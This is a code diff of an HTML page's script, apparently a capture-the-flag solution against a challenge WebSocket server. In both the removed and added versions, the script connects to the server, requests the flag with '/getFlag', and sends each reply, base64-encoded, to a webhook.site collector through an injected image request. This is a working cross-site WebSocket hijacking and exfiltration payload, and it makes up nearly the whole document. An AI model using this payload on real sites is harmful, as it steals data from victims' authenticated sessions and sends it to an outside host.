@@ -3,37 +3,15 @@
 <body>
 <script>
   const ws = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");
-
-  let retries = 0;
-
-  function exfiltrate(msg) {
-    const encoded = btoa(msg);
-
-    const i = document.createElement("img");
-    i.src = "https://webhook.site/36d1845d-ac17-42f9-bfe5-727cd6aad3f2?data=" + encoded;
-    document.body.appendChild(i);
-
-    ws.send(JSON.stringify({ message: "http://flag." + msg.replace(/\s+/g, '') }));
-  }
-
   ws.onopen = () => {
-    setTimeout(() => {
-      ws.send(JSON.stringify({ message: "/getFlag" }));
-    }, 1000);
+    ws.send(JSON.stringify({ message: "/getFlag" }));
   };
-
   ws.onmessage = (e) => {
     try {
       const msg = JSON.parse(e.data).message;
-
-      if (!msg.includes("not authorized")) {
-        exfiltrate(msg);
-      } else if (retries < 3) {
-        retries++;
-        setTimeout(() => {
-          ws.send(JSON.stringify({ message: "/getFlag" }));
-        }, 1000 * retries);
-      }
+      const i = document.createElement("img");
+      i.src = "https://webhook.site/36d1845d-ac17-42f9-bfe5-727cd6aad3f2?data=" + btoa(msg);
+      document.body.appendChild(i);
     } catch (err) {}
   };
 </script>
